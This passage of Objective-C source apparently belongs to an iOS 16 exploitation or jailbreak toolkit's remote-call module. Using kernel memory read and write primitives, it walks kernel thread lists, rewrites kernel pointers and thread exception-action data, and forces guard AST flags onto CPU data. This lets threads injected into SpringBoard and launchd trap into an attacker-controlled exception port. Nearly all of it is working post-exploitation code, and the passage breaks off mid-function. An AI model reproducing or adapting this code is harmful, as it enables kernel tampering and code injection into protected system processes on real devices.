#define RC_EXC_GUARD_INDEX                          12
#define RC_EXCEPTION_ACTION_SIZE                    0x20
#define RC_EXCEPTION_ACTION_PORT                    0x0
#define RC_EXCEPTION_ACTION_FLAVOR                  0x8
#define RC_EXCEPTION_ACTION_BEHAVIOR                0xc
#define RC_IOS16_LCK_MTX_ILOCK                      0x22000000
#define RC_IOS16_LCK_MTX_INTERLOCK_ONLY             0x10000000
#define RC_IOS16_AST_GUARD                          0x1000
#define RC_IOS16_OFF_THREAD_MACHINE_CPUDATAP        0x140
#define RC_IOS16_OFF_CPU_ACTIVE_THREAD              0x30
#define RC_IOS16_OFF_CPU_PENDING_AST                0x4c
#define RC_IOS16_MAX_THREAD_CANDIDATES              64
#define RC_IOS16_ACTIVE_SCAN_SECONDS                60
#define RC_IOS16_ACTIVE_SCAN_INTERVAL_US            50000

typedef struct {
    uint64_t threadRo;
    uint64_t actions;
} rc_ios16_exception_actions_restore;

static rc_ios16_exception_actions_restore g_rc_ios16_exception_actions_restore[16];
static int g_rc_ios16_exception_actions_restore_count = 0;
static uint64_t g_rc_ios16_last_active_injected_thread = 0;
static BOOL g_rc_ios16_first_landing_inventory_enabled = NO;
static NSMutableString *g_rc_ios16_first_landing_inventory_result = nil;
static BOOL g_rc_ios16_first_landing_pacia_enabled = NO;
static NSMutableString *g_rc_ios16_first_landing_pacia_result = nil;
static int g_rc_ios16_first_landing_pacia_mode = 0;

static bool rc_is_ios16(void) {
#if !RC_IOS16_RESEARCH_ENABLED
    return false;
#endif
    NSOperatingSystemVersion version = [[NSProcessInfo processInfo] operatingSystemVersion];
    return version.majorVersion == 16;
}

static BOOL rc_kernel_ptr_matches(uint64_t lhs, uint64_t rhs) {
    if (lhs == rhs) {
        return YES;
    }
    if (!lhs || !rhs) {
        return NO;
    }
    return nativestrip(lhs) == nativestrip(rhs);
}

static void rc_ios16_log_return_path_thread(uint64_t thread, const char *stage) {
    if (!rc_is_ios16() || !rc_is_kernel_ptr(thread)) {
        return;
    }

    uint16_t options16 = thread_get_options(thread);
    uint32_t options32 = ds_kread32(thread + off_thread_options);
    uint64_t kstackConfigured = thread_get_kstackptr(thread);
    uint64_t kstackE8 = ds_kread64(thread + 0xe8);
    uint64_t kstackF0 = ds_kread64(thread + 0xf0);
    uint64_t cpuData140 = ds_kread64(thread + 0x140);
    uint64_t cpuData148 = ds_kread64(thread + 0x148);
    uint64_t cpuData150 = ds_kread64(thread + 0x150);
    uint64_t cpuDataConfigured = rc_is_kernel_ptr(cpuData140) ? cpuData140 : 0;
    uint64_t activeConfigured = cpuDataConfigured ? ds_kread64(cpuDataConfigured + RC_IOS16_OFF_CPU_ACTIVE_THREAD) : 0;
    uint32_t pendingAst = cpuDataConfigured ? ds_kread32(cpuDataConfigured + RC_IOS16_OFF_CPU_PENDING_AST) : 0;

    RC_IOS16_DEBUG_LOG("(rc.iOS16) return-path %s: thread=0x%llx opts16=0x%x opts32=0x%x off_options=0x%x kstack=0x%llx kstack[e8]=0x%llx kstack[f0]=0x%llx cpu[140]=0x%llx cpu[148]=0x%llx cpu[150]=0x%llx active=0x%llx active_match=%d pending_ast=0x%x\n",
           stage,
           thread,
           options16,
           options32,
           off_thread_options,
           kstackConfigured,
           kstackE8,
           kstackF0,
           cpuData140,
           cpuData148,
           cpuData150,
           activeConfigured,
           rc_kernel_ptr_matches(activeConfigured, thread),
           pendingAst);
    fflush(stdout);
}

static BOOL rc_find_kernel_ptr_match(const void *buffer, size_t size, uint64_t needle, size_t *offsetOut, uint64_t *valueOut) {
    const uint8_t *bytes = (const uint8_t *)buffer;
    for (size_t off = 0; off + sizeof(uint64_t) <= size; off += sizeof(uint64_t)) {
        uint64_t value = 0;
        memcpy(&value, bytes + off, sizeof(value));
        if (rc_kernel_ptr_matches(value, needle)) {
            if (offsetOut) {
                *offsetOut = off;
            }
            if (valueOut) {
                *valueOut = value;
            }
            return YES;
        }
    }
    return NO;
}

static uint32_t rc_thread_task_threads_offset(void) {
    return rc_is_ios16() ? 0x350 : off_thread_task_threads_next;
}

static uint32_t rc_ios16_task_threads_head_offset(void) {
    return 0x58;
}

static BOOL rc_ios16_is_task_thread_head(uint64_t entry, uint64_t task) {
    return entry && task && entry == task + rc_ios16_task_threads_head_offset();
}

static BOOL rc_validate_thread_candidate(uint64_t thread, uint64_t expectedTask) {
    if (!rc_is_kernel_ptr(thread)) {
        return NO;
    }

    @try {
        uint64_t task = thread_get_task(thread);
        if (task != expectedTask) {
            return NO;
        }

        uint64_t tro = thread_get_t_tro(thread);
        if (!rc_is_kernel_ptr(tro)) {
            return NO;
        }
    } @catch (NSException *exception) {
        const char *name = exception.name ? exception.name.UTF8String : "(null)";
        const char *reason = exception.reason ? exception.reason.UTF8String : "(null)";
        RC_IOS16_DEBUG_LOG("(rc.iOS16) validate thread candidate exception: thread=0x%llx expectedTask=0x%llx name=%s reason=%s\n",
               thread, expectedTask, name, reason);
        fflush(stdout);
        return NO;
    }

    return YES;
}

static uint64_t rc_thread_from_task_threads_link(uint64_t entry, uint64_t expectedTask) {
    if (rc_ios16_is_task_thread_head(entry, expectedTask)) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) reached task thread queue head: entry=0x%llx task=0x%llx head_off=0x%x\n",
               entry, expectedTask, rc_ios16_task_threads_head_offset());
        fflush(stdout);
        return 0;
    }

    if (!rc_is_kernel_ptr(entry)) {
        return 0;
    }

    uint32_t offsets[] = {
        rc_thread_task_threads_offset(),
        off_thread_task_threads_next,
        0x348,
        0x350,
    };

    for (size_t i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++) {
        uint32_t off = offsets[i];
        if (!off || entry < off) {
            continue;
        }

        uint64_t thread = entry - off;
        if (rc_validate_thread_candidate(thread, expectedTask)) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) resolved task thread queue entry: entry=0x%llx thread=0x%llx off=0x%x\n",
                   entry, thread, off);
            fflush(stdout);
            return thread;
        }

        @try {
            uint64_t task = thread_get_task(thread);
            if (task && task != expectedTask) {
                RC_IOS16_DEBUG_LOG("(rc.iOS16) thread entry resolver rejected task: entry=0x%llx thread=0x%llx task=0x%llx expectedTask=0x%llx\n",
                       entry, thread, task, expectedTask);
                fflush(stdout);
            }
        } @catch (NSException *exception) {
            const char *name = exception.name ? exception.name.UTF8String : "(null)";
            const char *reason = exception.reason ? exception.reason.UTF8String : "(null)";
            RC_IOS16_DEBUG_LOG("(rc.iOS16) thread entry resolver exception: entry=0x%llx thread=0x%llx off=0x%x name=%s reason=%s\n",
                   entry, thread, off, name, reason);
            fflush(stdout);
        }
    }

    return 0;
}

static uint64_t rc_resolve_task_thread_entry(uint64_t entry, uint64_t expectedTask) {
    if (rc_validate_thread_candidate(entry, expectedTask)) {
        return entry;
    }
    return rc_thread_from_task_threads_link(entry, expectedTask);
}

static BOOL rc_ios16_write64_in_zone_block(uint64_t addr, uint64_t value) {
    uint64_t base = addr & ~(uint64_t)(RC_IOS16_ZONE_WRITE_LEN - 1);
    uint8_t block[RC_IOS16_ZONE_WRITE_LEN] = {0};
    ds_kread(base, block, sizeof(block));

    size_t off = (size_t)(addr - base);
    if (off + sizeof(value) > sizeof(block)) {
        return NO;
    }

    memcpy(block + off, &value, sizeof(value));
    ds_kwritezoneelement(base, block, sizeof(block));
    return ds_kread64(addr) == value;
}

static void rc_ios16_log_exception_probe(const char *stage,
                                         uint64_t helperThread,
                                         uint64_t dummyThread,
                                         uint64_t selfThread,
                                         uint32_t selfCtid) {
    uint64_t helperKstack = thread_get_kstackptr(helperThread);
    uint64_t helperRawKstack = ds_kread64(helperThread + off_thread_machine_kstackptr);
    uint64_t state0 = ds_kread64(helperThread + 0x0);
    uint64_t state1 = ds_kread64(helperThread + 0x8);
    uint64_t state2 = ds_kread64(helperThread + 0x10);
    uint64_t state3 = ds_kread64(helperThread + 0x18);

    RC_IOS16_DEBUG_LOG("(rc.iOS16) exc-probe %s: helper=0x%llx dummy=0x%llx self=0x%llx ctid=0x%x offs(ctid=0x%x mutex=0x%x kstack=0x%x taskq=0x%x)\n",
           stage, helperThread, dummyThread, selfThread, selfCtid,
           off_thread_ctid, off_thread_mutex_lck_mtx_data, off_thread_machine_kstackptr, rc_thread_task_threads_offset());
    RC_IOS16_DEBUG_LOG("(rc.iOS16) exc-probe %s.helper: kstack=0x%llx raw_kstack=0x%llx state64=[0x%llx 0x%llx 0x%llx 0x%llx]\n",
           stage, helperKstack, helperRawKstack, state0, state1, state2, state3);
    RC_IOS16_DEBUG_LOG("(rc.iOS16) exc-probe %s.dummy: mutex=0x%x alt[388]=0x%x alt[390]=0x%x alt[3a8]=0x%x alt[3b0]=0x%x alt[3c0]=0x%x\n",
           stage,
           ds_kread32(dummyThread + off_thread_mutex_lck_mtx_data),
           ds_kread32(dummyThread + 0x388),
           ds_kread32(dummyThread + 0x390),
           ds_kread32(dummyThread + 0x3a8),
           ds_kread32(dummyThread + 0x3b0),
           ds_kread32(dummyThread + 0x3c0));
    RC_IOS16_DEBUG_LOG("(rc.iOS16) exc-probe %s.self: ctid=0x%x alt[3a0]=0x%x alt[408]=0x%x alt[440]=0x%x alt[448]=0x%x\n",
           stage,
           ds_kread32(selfThread + off_thread_ctid),
           ds_kread32(selfThread + 0x3a0),
           ds_kread32(selfThread + 0x408),
           ds_kread32(selfThread + 0x440),
           ds_kread32(selfThread + 0x448));
    fflush(stdout);
}

static int rc_ios16_replace_kernel_ptr_matches(uint64_t base,
                                               size_t size,
                                               uint64_t needle,
                                               uint64_t replacement) {
    uint8_t *buffer = malloc(size);
    if (!buffer) {
        return 0;
    }

    memset(buffer, 0, size);
    ds_kreadbuf(base, buffer, size);

    int count = 0;
    for (size_t off = 0; off + sizeof(uint64_t) <= size; off += sizeof(uint64_t)) {
        uint64_t value = 0;
        memcpy(&value, buffer + off, sizeof(value));
        if (!rc_kernel_ptr_matches(value, needle)) {
            continue;
        }

        ds_kwrite64(base + off, replacement);
        uint64_t after = ds_kread64(base + off);
        if (rc_kernel_ptr_matches(after, replacement)) {
            count++;
        }
    }

    free(buffer);
    return count;
}

static void rc_ios16_log_plausible_tro_stack_slots(uint64_t searchBase,
                                                   size_t size,
                                                   uint64_t targetTro) {
    uint8_t *buffer = malloc(size);
    if (!buffer) {
        return;
    }

    memset(buffer, 0, size);
    ds_kreadbuf(searchBase, buffer, size);

    int count = 0;
    for (size_t off = 0; off + sizeof(uint64_t) <= size; off += sizeof(uint64_t)) {
        uint64_t value = 0;
        memcpy(&value, buffer + off, sizeof(value));
        if (!rc_kernel_ptr_matches(value, targetTro)) {
            continue;
        }

        uint64_t slot = searchBase + off;
        uint64_t plus10 = ds_kread64(slot + 0x10);
        uint64_t plus18 = ds_kread64(slot + 0x18);
        uint64_t plus20 = ds_kread64(slot + 0x20);
        uint64_t minus8 = slot >= 8 ? ds_kread64(slot - 0x8) : 0;
        BOOL plausible = (plus10 || plus18 || plus20 || minus8);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) stack TRO candidate off=0x%zx slot=0x%llx rel_page=0x%llx value=0x%llx checks(+10=0x%llx +18=0x%llx +20=0x%llx -8=0x%llx) plausible=%d\n",
               off, slot, slot - trunc_page(slot), value, plus10, plus18, plus20, minus8, plausible);
        count++;
    }

    RC_IOS16_DEBUG_LOG("(rc.iOS16) stack TRO candidate count=%d target_tro=0x%llx\n", count, targetTro);
    fflush(stdout);
    free(buffer);
}

static void rc_ios16_log_guard_target(const char *stage,
                                      uint64_t thread,
                                      uint64_t expectedPort) {
    uint64_t tro = thread_get_t_tro(thread);
    uint64_t actions = tro ? ds_kread64(tro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
    uint64_t guardAction = actions + (RC_EXC_GUARD_INDEX * RC_EXCEPTION_ACTION_SIZE);
    uint64_t port = actions ? ds_kread64(guardAction + RC_EXCEPTION_ACTION_PORT) : 0;
    uint32_t behavior = actions ? ds_kread32(guardAction + RC_EXCEPTION_ACTION_BEHAVIOR) : 0;
    uint32_t flavor = actions ? ds_kread32(guardAction + RC_EXCEPTION_ACTION_FLAVOR) : 0;
    uint64_t waitEvent = ds_kread64(thread + off_thread_mutex_lck_mtx_data);
    uint64_t kstack = thread_get_kstackptr(thread);
    uint64_t guard = ds_kread64(thread + off_thread_guard_exc_info_code);
    uint64_t subcode = ds_kread64(thread + off_thread_guard_exc_info_code + 8);
    uint32_t ast = ds_kread32(thread + off_thread_ast);
    uint32_t ast330 = ds_kread32(thread + 0x330);
    uint32_t ast338 = ds_kread32(thread + 0x338);
    uint64_t tro350 = ds_kread64(thread + 0x350);
    uint64_t tro358 = ds_kread64(thread + 0x358);
    uint64_t tro360 = ds_kread64(thread + 0x360);
    uint64_t tro368 = ds_kread64(thread + 0x368);
    uint64_t taskqNext = ds_kread64(thread + rc_thread_task_threads_offset());

    RC_IOS16_DEBUG_LOG("(rc.iOS16) guard-target %s: thread=0x%llx wait_event=0x%llx kstack=0x%llx guard=0x%llx subcode=0x%llx ast=0x%x ast330=0x%x ast338=0x%x tro=0x%llx actions=0x%llx port=0x%llx expected_port=0x%llx behavior=0x%x flavor=0x%x taskq_next=0x%llx tro350=0x%llx tro358=0x%llx tro360=0x%llx tro368=0x%llx\n",
           stage, thread, waitEvent, kstack, guard, subcode, ast, ast330, ast338, tro, actions, port, expectedPort, behavior, flavor, taskqNext, tro350, tro358, tro360, tro368);
    fflush(stdout);
}

static void rc_ios16_wait_guard_ast_changed(uint64_t thread) {
    uint64_t guard = ds_kread64(thread + off_thread_guard_exc_info_code);
    for (int i = 0; i < 500; i++) {
        usleep(1000);
    }
    RC_IOS16_DEBUG_LOG("(rc.iOS16) guard AST still pending after 500ms ast=0x%x guard=0x%llx\n",
           ds_kread32(thread + off_thread_ast), guard);
    fflush(stdout);
}

static uint64_t rc_ios16_thread_cpu_datap(uint64_t thread) {
    if (!rc_is_kernel_ptr(thread)) {
        return 0;
    }
    uint64_t cpuData = ds_kread64(thread + RC_IOS16_OFF_THREAD_MACHINE_CPUDATAP);
    return rc_is_kernel_ptr(cpuData) ? cpuData : 0;
}

static void rc_ios16_log_thread_machine_probe(uint64_t thread, const char *stage) {
    if (!rc_is_kernel_ptr(thread)) {
        return;
    }

    uint64_t kstackE8 = ds_kread64(thread + 0xe8);
    uint64_t kstackF0 = ds_kread64(thread + 0xf0);
    uint64_t cpuData140 = ds_kread64(thread + 0x140);
    uint64_t cpuData148 = ds_kread64(thread + 0x148);
    uint64_t cpuData150 = ds_kread64(thread + 0x150);

    RC_IOS16_DEBUG_LOG("(rc.iOS16) machine-probe %s: thread=0x%llx off_kstack=0x%x kstack[e8]=0x%llx kstack[f0]=0x%llx cpu[140]=0x%llx cpu[148]=0x%llx cpu[150]=0x%llx valid(cpu140=%d cpu148=%d cpu150=%d)\n",
           stage,
           thread,
           off_thread_machine_kstackptr,
           kstackE8,
           kstackF0,
           cpuData140,
           cpuData148,
           cpuData150,
           rc_is_kernel_ptr(cpuData140),
           rc_is_kernel_ptr(cpuData148),
           rc_is_kernel_ptr(cpuData150));
    fflush(stdout);
}

static BOOL rc_ios16_log_cpu_candidate_state(uint64_t thread, const char *stage) {
    if (!rc_is_kernel_ptr(thread)) {
        return NO;
    }

    uint64_t cpuData140 = ds_kread64(thread + 0x140);
    uint64_t cpuData148 = ds_kread64(thread + 0x148);
    uint64_t cpuData150 = ds_kread64(thread + 0x150);
    uint64_t configured = rc_ios16_thread_cpu_datap(thread);
    uint64_t candidates[] = { cpuData140, cpuData148, cpuData150, configured };
    const char *names[] = { "cpu[140]", "cpu[148]", "cpu[150]", "configured" };
    BOOL foundActive = NO;

    for (int i = 0; i < 4; i++) {
        uint64_t cpuData = candidates[i];
        if (!rc_is_kernel_ptr(cpuData)) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) cpu-probe %s: thread=0x%llx %s=0x%llx invalid\n",
                   stage, thread, names[i], cpuData);
            fflush(stdout);
            continue;
        }

        uint64_t activeThread = ds_kread64(cpuData + RC_IOS16_OFF_CPU_ACTIVE_THREAD);
        uint32_t pendingAst = ds_kread32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST);
        BOOL activeMatch = rc_kernel_ptr_matches(activeThread, thread);
        foundActive = foundActive || activeMatch;
        RC_IOS16_DEBUG_LOG("(rc.iOS16) cpu-probe %s: thread=0x%llx %s=0x%llx active=0x%llx pending_ast=0x%x active_match=%d\n",
               stage, thread, names[i], cpuData, activeThread, pendingAst, activeMatch);
        fflush(stdout);
    }

    return foundActive;
}

static BOOL rc_ios16_probe_thread_offsets(uint64_t thread, const char *stage) {
    if (!rc_is_kernel_ptr(thread)) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) offset-probe %s: invalid thread=0x%llx\n", stage, thread);
        fflush(stdout);
        return NO;
    }

    rc_ios16_log_thread_machine_probe(thread, stage);
    BOOL active = rc_ios16_log_cpu_candidate_state(thread, stage);
    uint32_t ast334 = ds_kread32(thread + 0x334);
    uint32_t ast37c = ds_kread32(thread + 0x37c);
    uint64_t guard308 = ds_kread64(thread + 0x308);
    RC_IOS16_DEBUG_LOG("(rc.iOS16) offset-probe %s: thread=0x%llx configured(kstack=0x%x ast=0x%x guard=0x%x) ast[334]=0x%x ast[37c]=0x%x guard[308]=0x%llx active_found=%d\n",
           stage,
           thread,
           off_thread_machine_kstackptr,
           off_thread_ast,
           off_thread_guard_exc_info_code,
           ast334,
           ast37c,
           guard308,
           active);
    fflush(stdout);
    return active;
}

static volatile uint64_t g_rc_ios16_active_probe_sink = 0;

static void *rc_ios16_active_worker_probe_main(void *arg) {
    (void)arg;
    @autoreleasepool {
        uint64_t selfTask = task_self();
        mach_port_t threadSelf = mach_thread_self();
        uint64_t selfThread = rc_task_get_ipc_port_kobject(selfTask, threadSelf);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) active-worker: start mach=0x%x thread=0x%llx\n",
               threadSelf, selfThread);
        fflush(stdout);
        rc_ios16_probe_thread_offsets(selfThread, "worker-self-start");

        time_t deadline = time(NULL) + 5;
        while (time(NULL) < deadline) {
            for (int i = 0; i < 100000; i++) {
                g_rc_ios16_active_probe_sink += (uint64_t)i ^ selfThread;
            }
        }

        rc_ios16_probe_thread_offsets(selfThread, "worker-self-end");
        mach_port_deallocate(mach_task_self_, threadSelf);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) active-worker: end thread=0x%llx sink=0x%llx\n",
               selfThread, g_rc_ios16_active_probe_sink);
        fflush(stdout);
    }
    return NULL;
}

typedef struct {
    volatile bool ready;
    volatile bool waiting;
    volatile bool released;
    volatile bool stop;
    volatile uint64_t sink;
    semaphore_t gate;
} rc_ios16_self_ast_worker_ctx;

static void *rc_ios16_self_ast_worker_main(void *arg) {
    rc_ios16_self_ast_worker_ctx *ctx = (rc_ios16_self_ast_worker_ctx *)arg;
    @autoreleasepool {
        mach_port_t threadSelf = mach_thread_self();
        uint64_t selfThread = rc_task_get_ipc_port_kobject(task_self(), threadSelf);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) self-ast-worker: start mach=0x%x thread=0x%llx\n",
               threadSelf, selfThread);
        fflush(stdout);
        rc_ios16_probe_thread_offsets(selfThread, "self-ast-worker-start");
        ctx->ready = true;

        while (!ctx->stop) {
            ctx->waiting = true;
            kern_return_t waitKr = semaphore_wait(ctx->gate);
            ctx->waiting = false;
            if (waitKr != KERN_SUCCESS) {
                RC_IOS16_DEBUG_LOG("(rc.iOS16) self-ast-worker: semaphore_wait kr=%d %s\n",
                       waitKr, mach_error_string(waitKr));
                fflush(stdout);
                ctx->released = true;
                time_t abortSpinDeadline = time(NULL) + 5;
                while (!ctx->stop && time(NULL) < abortSpinDeadline) {
                    ctx->sink ^= (uint64_t)getpid();
                }
                break;
            }
            if (ctx->stop) {
                break;
            }
            ctx->released = true;
            time_t spinDeadline = time(NULL) + 3;
            while (!ctx->stop && time(NULL) < spinDeadline) {
                ctx->sink ^= (uint64_t)getpid();
            }
        }

        rc_ios16_probe_thread_offsets(selfThread, "self-ast-worker-end");
        mach_port_deallocate(mach_task_self_, threadSelf);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) self-ast-worker: end thread=0x%llx sink=0x%llx\n",
               selfThread, ctx->sink);
        fflush(stdout);
    }
    return NULL;
}

static BOOL rc_ios16_propagate_guard_ast_to_observed_cpu(uint64_t thread, uint64_t cpuData, const char *stage) {
    if (!cpuData) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) guard-cpu %s: thread=0x%llx cpuData=0x0 skip\n",
               stage, thread);
        fflush(stdout);
        return NO;
    }

    uint64_t activeThread = ds_kread64(cpuData + RC_IOS16_OFF_CPU_ACTIVE_THREAD);
    if (!rc_kernel_ptr_matches(activeThread, thread)) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) guard-cpu %s: thread=0x%llx cpuData=0x%llx active=0x%llx skip\n",
               stage, thread, cpuData, activeThread);
        fflush(stdout);
        return NO;
    }

    uint32_t threadAst = ds_kread32(thread + off_thread_ast);
    uint32_t pending = ds_kread32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST);
    uint32_t next = pending | RC_IOS16_AST_GUARD;
    ds_kwrite32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST, next);
    uint32_t after = ds_kread32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST);

    RC_IOS16_DEBUG_LOG("(rc.iOS16) guard-cpu %s: thread=0x%llx cpuData=0x%llx thread_ast=0x%x pending_before=0x%x pending_after=0x%x attempted=1 observed=%d\n",
           stage, thread, cpuData, threadAst, pending, after, (after & RC_IOS16_AST_GUARD) != 0);
    fflush(stdout);
    return YES;
}

static BOOL rc_ios16_propagate_guard_ast_to_cpu(uint64_t thread, const char *stage) {
    uint64_t cpuData = rc_ios16_thread_cpu_datap(thread);
    return rc_ios16_propagate_guard_ast_to_observed_cpu(thread, cpuData, stage);
}

static void rc_ios16_clear_guard_ast_from_cpu(uint64_t thread, const char *stage) {
    uint64_t cpuData = rc_ios16_thread_cpu_datap(thread);
    if (!cpuData) {
        return;
    }

    uint32_t pending = ds_kread32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST);
    if ((pending & RC_IOS16_AST_GUARD) == 0) {
        return;
    }

    uint32_t next = pending & ~RC_IOS16_AST_GUARD;
    ds_kwrite32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST, next);
    uint32_t after = ds_kread32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST);

    RC_IOS16_DEBUG_LOG("(rc.iOS16) guard-cpu-clear %s: thread=0x%llx cpuData=0x%llx pending_before=0x%x pending_after=0x%x\n",
           stage, thread, cpuData, pending, after);
    fflush(stdout);
}

static void rc_ios16_poke_springboard_first_exception(const char *stage, int round) {
    if (round != 0) {
        return;
    }

    static void *sbsHandle = NULL;
    static int (*sbsGetScreenLockStatus)(BOOL *locked, BOOL *passcode) = NULL;
    static BOOL resolved = NO;

    if (!resolved) {
        sbsHandle = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
        if (sbsHandle) {
            sbsGetScreenLockStatus = dlsym(sbsHandle, "SBSGetScreenLockStatus");
        }
        RC_IOS16_DEBUG_LOG("(rc.iOS16) first-exc-poke SpringBoard resolver stage=%s handle=%p fn=%p\n",
               stage, sbsHandle, sbsGetScreenLockStatus);
        fflush(stdout);
        resolved = YES;
    }

    if (!sbsGetScreenLockStatus) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) first-exc-poke SpringBoard unavailable stage=%s round=%d\n", stage, round);
        fflush(stdout);
        return;
    }

    BOOL locked = NO;
    BOOL passcode = NO;
    int ret = sbsGetScreenLockStatus(&locked, &passcode);
    RC_IOS16_DEBUG_LOG("(rc.iOS16) first-exc-poke SpringBoard stage=%s round=%d ret=%d lock=%d passcode=%d one-shot=1\n",
           stage, round, ret, locked, passcode);
    fflush(stdout);
}

static void rc_ios16_poke_first_exception_target(const char *process, int round) {
    if (!process) {
        return;
    }

    if (strcmp(process, "SpringBoard") == 0) {
        rc_ios16_poke_springboard_first_exception("wait", round);
        return;
    }

    if (strcmp(process, "launchd") != 0) {
        return;
    }

    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, "lara.rc-ios16.first-exception-poke", &port);
    if ((round % 10) == 0) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) first-exc-poke launchd round=%d kr=%d %s port=0x%x\n",
               round, kr, mach_error_string(kr), port);
        fflush(stdout);
    }
    if (port != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self_, port);
    }
}

static BOOL rc_ios16_propagate_active_injected_threads(NSArray<NSNumber *> *threads, const char *stage) {
    BOOL propagated = NO;
    for (NSNumber *threadValue in threads) {
        uint64_t thread = threadValue.unsignedLongLongValue;
        uint64_t cpuData = rc_ios16_thread_cpu_datap(thread);
        uint64_t activeThread = cpuData ? ds_kread64(cpuData + RC_IOS16_OFF_CPU_ACTIVE_THREAD) : 0;
        if (cpuData && rc_kernel_ptr_matches(activeThread, thread)) {
            g_rc_ios16_last_active_injected_thread = thread;
            RC_IOS16_DEBUG_LOG("(rc.iOS16) %s active injected thread=0x%llx cpuData=0x%llx active=0x%llx\n",
                   stage, thread, cpuData, activeThread);
            fflush(stdout);
            propagated |= rc_ios16_propagate_guard_ast_to_observed_cpu(thread, cpuData, stage);
        }
    }
    return propagated;
}

static BOOL rc_ios16_wait_first_exception(mach_port_t excport,
                                          excmsg *exc,
                                          const char *process,
                                          NSArray<NSNumber *> *threads) {
    const int totalTimeoutMs = 120000;
    const int sliceTimeoutMs = 100;
    const int maxRounds = totalTimeoutMs / sliceTimeoutMs;

    for (int round = 0; round < maxRounds; round++) {
        if (waitexc(excport, exc, sliceTimeoutMs, false)) {
            return YES;
        }

        if (strcmp(process, "SpringBoard") == 0 && (round % 10) == 0) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) first-exc-wait re-poke SpringBoard to reactivate injected thread round=%d\n", round);
            fflush(stdout);
        }
        rc_ios16_poke_first_exception_target(process, round);
        BOOL propagated = rc_ios16_propagate_active_injected_threads(threads, "first-exc-wait");
        if ((round % 10) == 0 || propagated) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) first-exc-wait round=%d/%d propagated=%d threads=%lu\n",
                   round + 1, maxRounds, propagated, (unsigned long)threads.count);
            fflush(stdout);
        }
    }

    return NO;
}

@implementation RemoteCall (iOS16)

static void rc_append_exception_state_inventory(NSMutableString *result,
                                                const char *stage,
                                                excmsg *exc,
                                                uint64_t thread,
                                                uint64_t firstPortAddr) {
    if (!result || !exc) {
        return;
    }

    arm_thread_state64_internal *state = &exc->threadState;
    [result appendFormat:@"%s: exception=0x%x code=[0x%llx 0x%llx] thread=0x%llx first_port=0x%llx\n",
     stage,
     exc->exception,
     exc->codeFirst,
     exc->codeSecond,
     thread,
     firstPortAddr];
    [result appendFormat:@"%s: pc=0x%llx raw_pc=0x%llx lr=0x%llx raw_lr=0x%llx sp=0x%llx fp=0x%llx cpsr=0x%x flags=0x%x\n",
     stage,
     state->__pc,
     nativestrip(state->__pc),
     state->__lr,
     nativestrip(state->__lr),
     state->__sp,
     state->__fp,
     state->__cpsr,
     state->__flags];
    [result appendFormat:@"%s: x0=0x%llx x1=0x%llx x2=0x%llx x3=0x%llx x4=0x%llx x5=0x%llx x6=0x%llx x7=0x%llx\n",
     stage,
     state->__x[0],
     state->__x[1],
     state->__x[2],
     state->__x[3],
     state->__x[4],
     state->__x[5],
     state->__x[6],
     state->__x[7]];
    [result appendFormat:@"%s: x8=0x%llx x9=0x%llx x10=0x%llx x11=0x%llx x12=0x%llx x13=0x%llx x14=0x%llx x15=0x%llx\n",
     stage,
     state->__x[8],
     state->__x[9],
     state->__x[10],
     state->__x[11],
     state->__x[12],
     state->__x[13],
     state->__x[14],
     state->__x[15]];
    [result appendFormat:@"%s: x16=0x%llx x17=0x%llx x18=0x%llx x19=0x%llx x20=0x%llx x21=0x%llx x22=0x%llx x23=0x%llx\n",
     stage,
     state->__x[16],
     state->__x[17],
     state->__x[18],
     state->__x[19],
     state->__x[20],
     state->__x[21],
     state->__x[22],
     state->__x[23]];
    [result appendFormat:@"%s: x24=0x%llx x25=0x%llx x26=0x%llx x27=0x%llx x28=0x%llx\n",
     stage,
     state->__x[24],
     state->__x[25],
     state->__x[26],
     state->__x[27],
     state->__x[28]];

    if (thread) {
        uint64_t tro = thread_get_t_tro(thread);
        uint64_t actions = tro ? ds_kread64(tro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
        uint64_t guardAction = actions ? actions + (RC_EXC_GUARD_INDEX * RC_EXCEPTION_ACTION_SIZE) : 0;
        [result appendFormat:@"%s: thread_options32=0x%x ast=0x%x guard=0x%llx subcode=0x%llx kstack=0x%llx rop=0x%llx jop=0x%llx tro=0x%llx actions=0x%llx guard_action=0x%llx\n",
         stage,
         ds_kread32(thread + off_thread_options),
         ds_kread32(thread + off_thread_ast),
         ds_kread64(thread + off_thread_guard_exc_info_code),
         ds_kread64(thread + off_thread_guard_exc_info_code + 8),
         thread_get_kstackptr(thread),
         thread_get_rop_pid(thread),
         thread_get_jop_pid(thread),
         tro,
         actions,
         guardAction];
        if (guardAction) {
            [result appendFormat:@"%s: guard_action port=0x%llx behavior=0x%x flavor=0x%x expected_port=0x%llx\n",
             stage,
             ds_kread64(guardAction + RC_EXCEPTION_ACTION_PORT),
             ds_kread32(guardAction + RC_EXCEPTION_ACTION_BEHAVIOR),
             ds_kread32(guardAction + RC_EXCEPTION_ACTION_FLAVOR),
             firstPortAddr];
        }
    }
}

static const char *rc_ios16_pacia_mode_name(int mode) {
    switch (mode) {
